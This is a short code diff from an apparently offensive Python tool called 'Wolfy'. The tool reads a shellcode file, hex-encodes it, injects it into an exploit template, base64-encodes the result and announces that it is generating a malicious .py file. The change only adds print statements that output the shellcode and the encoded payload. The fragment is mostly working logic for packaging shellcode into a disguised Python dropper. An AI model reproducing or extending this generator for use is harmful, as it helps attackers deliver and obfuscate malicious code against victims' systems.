@@ -63,13 +63,13 @@ class Wolfy:
 
         shellcode_payload = open(self.shellcode_file, "rb").read()
         shellcode_payload = bytes.hex(shellcode_payload)
-
+        print(shellcode_payload)
         print("[INFO] - Replacing shellcode")
         # replacing shellcode 
         f_xpl_data = open("templates/xpl.py","r").read()
         f_xpl_data = f_xpl_data.replace("__replacepayload__", shellcode_payload)
         f_xpl_data = base64.b64encode(f_xpl_data.encode('utf-8'))
-        # print(f_xpl_data.decode('utf-8'))
+        print(f_xpl_data.decode('utf-8'))
 
         print("[INFO] - Generating malicious .py")
 
